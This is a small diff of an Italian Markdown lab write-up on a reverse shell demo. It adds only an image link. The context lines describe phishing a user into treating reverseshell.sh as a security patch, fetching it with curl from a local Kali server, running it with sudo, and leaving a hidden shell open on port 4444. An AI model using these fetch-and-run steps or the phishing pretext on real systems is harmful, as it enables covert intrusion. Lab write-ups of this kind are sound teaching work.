@@ -51,6 +51,10 @@ A questo punto, l'unica cosa che rimane da fare, è mettersi in ascolto sulla po
 Per creare la reverse shell, è necessario che l'utente sulla macchina attaccata venga convinto a scaricare ed eseguire il file `reverseshell.sh`, questo potrebbe essere fatto creando una mail di phishing e convincendolo, per esempio, che si tratti di una patch di sicurezza. Nella demo, viene utilizzando il comando `curl -O "http://10.0.2.2/demo/reverseshell.sh"`, che scarica il file dal web file server creato su Kali, a questo punto si esegue il comando `sudo chmod +x reverseshell.sh` che aggiunge il permesso di esecuzione al file con privilegi di amministratore, infine viene eseguito il file con `./reverseshell.sh`. 
 A questo punto, essendo la reverse shell eseguita in background, l'utente su Ubuntu può continuare ad utilizzare il terminale normalmente, senza accorgersi di nulla, ma in realtà è connesso sulla porta 4444 alla macchina Kali attraverso una reverse shell.
 
+![Reverse Shell](images/reverseshell.png)
+
+
+
 
 _Figure 1: The Markdown Mark_
 
